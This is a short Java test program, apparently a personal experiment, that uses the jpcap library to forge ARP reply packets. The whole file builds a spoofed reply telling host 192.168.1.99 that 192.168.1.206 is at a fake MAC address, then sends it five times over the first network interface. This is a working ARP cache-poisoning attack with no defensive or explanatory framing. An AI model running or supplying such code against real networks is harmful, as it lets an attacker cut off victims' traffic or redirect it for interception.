package com.jiangnan.test;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

import java.io.IOException;
import java.net.InetAddress;

public class AprTest2 {

	public static void main(String[] args) throws Exception {
		test01();
	}

	// 给指定IP发送mac地址
	private static void test01() throws IOException {
		ARPPacket arp = new ARPPacket();
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;
		arp.prototype = ARPPacket.PROTOTYPE_IP;
		arp.hlen = 6;
		arp.plen = 4;
		arp.operation = ARPPacket.ARP_REPLY;

		// target
		arp.target_hardaddr = getMacByteByHex("c8:9c:dc:37:d9:92".split(":"));
		InetAddress targetAddr = InetAddress.getByName("192.168.1.99");
		arp.target_protoaddr = targetAddr.getAddress();

		// sender
		arp.sender_hardaddr = getMacByteByHex("cc:cc:cc:cc:cc:cc".split(":"));
		InetAddress senderAddr = InetAddress.getByName("192.168.1.206");
		arp.sender_protoaddr = senderAddr.getAddress();
		
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac = arp.sender_hardaddr;
		ether.dst_mac = arp.target_hardaddr;
		// 数据链
		arp.datalink = ether;
		
		JpcapSender sender = JpcapSender.openDevice(JpcapCaptor.getDeviceList()[0]);
		for (int i = 0; i < 5; i++) {
			sender.sendPacket(arp);
		}
	}

	private static byte[] getMacByteByHex(String[] hex) {
		byte[] mac = new byte[hex.length];
		int i = 0;
		for (String h : hex) {
			mac[i++] = (byte) Integer.parseInt(h, 16);
		}
		return mac;
	}
}
